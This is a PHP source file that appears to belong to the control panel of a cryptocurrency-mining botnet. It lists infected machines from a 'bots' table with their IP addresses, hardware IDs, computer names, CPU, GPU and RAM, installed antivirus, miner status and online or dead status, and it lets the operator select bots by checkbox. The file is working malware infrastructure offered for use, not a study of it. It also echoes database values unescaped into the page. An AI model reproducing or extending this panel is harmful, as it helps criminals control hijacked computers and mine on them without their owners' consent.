<?php

include('../inc/config.php');
include('../inc/functions.php');
AuthenticatedCheck('LoggedOut');

$perpage = $settings->botspg;
$init = !empty($_GET['init']) && $_GET['init']%$perpage == 0 ? (int)$_GET['init'] : 0;

$data = $con->prepare("SELECT * FROM `bots` ORDER BY time DESC LIMIT $init, $perpage");
$data->execute();

$fetch = $data->fetchAll(PDO::FETCH_ASSOC);

echo '<table>
          <th>Flag</th>
          <th>Country</th>
          <th>HWID</th>
          <th>IP</th>
          <th>Computer</th>
          <th>OS</th>
          <th>CPU</th>
          <th>GPU</th>
          <th>RAM</th>
          <th>AV</th>
          <th>Miner</th>
          <th>Status</th>
          <th>Last seen</th>
          <th>First seen</th>
          <th><input type="checkbox" id="checkall" name="checkall" class="botid"/></th>';

foreach($fetch as $row)
{
    switch(true)
    {
        case (time()-$row['time']) <= 20:
            $status = '<font color="limegreen">Online</font>';
            break;
        
        case (time()-$row['time']) > 86400*$settings->deadline:
            $status = '<font color="gray">Dead</font>';
            break;
            
        default:
            $status = '<font color="red">Offline</font>';
    }
  
    $flag     = '<img src="img/flags/' . $row['country'] . '.png" width="18" height="18">';
    $miner = !empty($settings->pool) ? '<font color="limegreen">Yes</font>' : '<font color="red">No</font>';
    $firstcon = Ago($row['firstconnected']);
    $lastcon  = Ago($row['time']);
    
    echo '<tr>
              <td>' . $flag . '</td>
              <td>' . $row['country'] . '</td>
              <td>' . $row['hwid'] . '</td>
              <td>' . $row['ip'] . '</td>
              <td>' . $row['name'] . '</td>
              <td>' . $row['os'] . '</td>
              <td>' . $row['cpu'] . '</td>
              <td>' . $row['gpu'] . '</td>
              <td>' . $row['ram'] . ' GB</td>
              <td>' . $row['av'] . '</td>
              <td>' .$miner .'</td>
              <td>' . $status . '</td>
              <td>' . $lastcon . '</td>
              <td>' . $firstcon . '</td>
              <td><input type="checkbox" name="hwid[]" class="botid" value="' . $row['hwid'] . '"/></td>
          </tr>';
}

echo '</table>';

?>